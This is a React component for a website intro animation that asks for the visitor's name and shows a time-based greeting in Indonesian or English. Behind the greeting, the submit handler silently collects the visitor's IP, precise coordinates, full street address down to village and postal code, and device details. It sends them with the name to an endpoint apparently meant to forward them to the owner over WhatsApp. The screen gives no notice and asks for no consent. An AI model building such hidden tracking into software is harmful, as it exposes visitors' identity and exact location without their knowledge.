'use client';

import { useState, useEffect, useRef } from 'react';
import { useTranslation } from 'react-i18next';
import gsap from 'gsap';
import SplitText from './SplitText';
import '@/lib/i18n';
import { getDeviceInfo, getDetailedLocationInfo } from '@/lib/device-info';

export default function IntroSequence() {
    const { t } = useTranslation('common');
    const [isMounted, setIsMounted] = useState(false);
    const [step, setStep] = useState<'loading' | 'input' | 'greeting' | 'complete'>('loading');
    const [progress, setProgress] = useState(0);
    const [name, setName] = useState('');
    const containerRef = useRef<HTMLDivElement>(null);
    const inputRef = useRef<HTMLInputElement>(null);
    const contentRef = useRef<HTMLDivElement>(null);

    useEffect(() => {
        setIsMounted(true);
    }, []);

    useEffect(() => {
        const timer = setInterval(() => {
            setProgress((prev) => {
                if (prev >= 100) {
                    clearInterval(timer);
                    return 100;
                }
                return prev + 1;
            });
        }, 20);

        return () => clearInterval(timer);
    }, []);

    useEffect(() => {
        if (progress === 100 && step === 'loading') {
            gsap.to(contentRef.current, {
                opacity: 0,
                y: -20,
                duration: 0.5,
                onComplete: () => {
                    setStep('input');
                    gsap.set(contentRef.current, { y: 20, opacity: 0 });
                    gsap.to(contentRef.current, {
                        y: 0,
                        opacity: 1,
                        duration: 0.5,
                        delay: 0.2
                    });
                }
            });
        }
    }, [progress, step]);

    useEffect(() => {
        if (step === 'input' && inputRef.current) {
            setTimeout(() => inputRef.current?.focus(), 100);
        }
    }, [step]);

    useEffect(() => {
        if (step === 'greeting' && contentRef.current) {
            gsap.set(contentRef.current, { y: 20, opacity: 0 });
            gsap.to(contentRef.current, {
                y: 0,
                opacity: 1,
                duration: 0.5
            });
        }
    }, [step]);

    const handleNameSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!name.trim()) return;

        const deviceInfo = getDeviceInfo();
        const locationInfo = await getDetailedLocationInfo();

        const visitorData = {
            name: name.trim(),
            ip: locationInfo.ip,
            latitude: locationInfo.latitude,
            longitude: locationInfo.longitude,
            accuracy: locationInfo.accuracy,
            mapsLink: locationInfo.mapsLink,
            address: locationInfo.address,
            village: locationInfo.village,
            district: locationInfo.district,
            city: locationInfo.city,
            province: locationInfo.province,
            country: locationInfo.country,
            postalCode: locationInfo.postalCode,
            fullAddress: locationInfo.fullAddress,
            browser: deviceInfo.browser,
            os: deviceInfo.os,
            deviceType: deviceInfo.deviceType,
            screenResolution: deviceInfo.screenResolution,
            language: deviceInfo.language,
            timezone: deviceInfo.timezone,
            timestamp: new Date().toLocaleString('id-ID', {
                timeZone: 'Asia/Jakarta',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            })
        };

        fetch('/api/send-whatsapp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(visitorData),
        }).catch(error => {
            console.error('Failed to send notification:', error);
        });

        gsap.to(contentRef.current, {
            opacity: 0,
            y: -20,
            duration: 0.5,
            onComplete: () => {
                setStep('greeting');
            }
        });
    };

    const { i18n } = useTranslation();

    const getTimeBasedGreeting = (lang: string) => {
        const hour = new Date().getHours();
        const isIndonesian = lang === 'id' || lang.startsWith('id');

        if (isIndonesian) {
            if (hour >= 0 && hour < 4) return 'saatnya kau tidur';
            if (hour >= 4 && hour < 11) return 'selamat pagi';
            if (hour >= 11 && hour < 15) return 'selamat siang';
            if (hour >= 15 && hour < 18) return 'selamat sore';
            return 'selamat malam';
        } else {
            if (hour >= 0 && hour < 4) return 'good night';
            if (hour >= 4 && hour < 11) return 'good morning';
            if (hour >= 11 && hour < 15) return 'good afternoon';
            if (hour >= 15 && hour < 18) return 'good evening';
            return 'good evening';
        }
    };

    const timeGreeting = isMounted ? getTimeBasedGreeting(i18n.language) : 'good morning';

    const handleGreetingComplete = () => {
        setTimeout(() => {
            gsap.to(containerRef.current, {
                y: '-100%',
                duration: 1,
                ease: 'power4.inOut',
                onComplete: () => {
                    setStep('complete');
                    window.dispatchEvent(new Event('intro-complete'));
                }
            });
        }, 2000);
    };

    if (step === 'complete') return null;

    return (
        <div
            ref={containerRef}
            className="fixed top-0 left-0 w-full h-screen bg-black z-[99999] flex items-center justify-center text-white overflow-hidden"
        >
            <div ref={contentRef} className="w-full max-w-none px-4 sm:px-6 md:px-8 lg:px-12 flex flex-col items-center justify-center">
                {step === 'loading' && (
                    <div className="text-6xl sm:text-7xl md:text-8xl lg:text-9xl xl:text-[10rem] font-bold tracking-tighter">
                        {progress}%
                    </div>
                )}

                {step === 'input' && (
                    <form onSubmit={handleNameSubmit} className="w-full max-w-4xl flex flex-col items-center gap-4 sm:gap-5 md:gap-6">
                        <h2 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-light opacity-80 text-center">
                            {isMounted ? t('intro.question') : "What's your name?"}
                        </h2>
                        <input
                            ref={inputRef}
                            type="text"
                            value={name}
                            onChange={(e) => setName(e.target.value)}
                            className="w-full max-w-2xl bg-transparent border-b-2 border-white/20 text-center text-2xl sm:text-3xl md:text-4xl lg:text-5xl xl:text-6xl font-bold py-3 sm:py-4 focus:outline-none focus:border-white transition-colors placeholder:text-white/10"
                            placeholder={isMounted ? t('intro.placeholder') : 'Type here...'}
                        />
                        <button
                            type="submit"
                            className="mt-2 sm:mt-3 md:mt-4 px-6 sm:px-7 md:px-8 py-2.5 sm:py-3 rounded-full border border-white/20 hover:bg-white hover:text-black transition-all duration-300 uppercase tracking-widest text-xs sm:text-sm"
                        >
                            {isMounted ? t('intro.button') : 'Enter'}
                        </button>
                    </form>
                )}

                {step === 'greeting' && (
                    <div className="text-center relative z-10 w-full max-w-6xl px-4 sm:px-6 md:px-8">
                        <div className="w-full break-words overflow-wrap-anywhere">
                            <SplitText
                                text={`${isMounted ? t('intro.greeting') : 'Hello'} ${timeGreeting}, ${name}!`}
                                className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl xl:text-7xl 2xl:text-8xl font-bold tracking-tight text-center !leading-[1.2] sm:!leading-[1.3]"
                                delay={100}
                                duration={0.6}
                                ease="power3.out"
                                splitType="words"
                                from={{ opacity: 0, y: 40 }}
                                to={{ opacity: 1, y: 0 }}
                                threshold={0.1}
                                rootMargin="-100px"
                                textAlign="center"
                                triggerOnScroll={false}
                                onLetterAnimationComplete={handleGreetingComplete}
                            />
                        </div>
                    </div>
                )}
            </div>
        </div>
    );
}
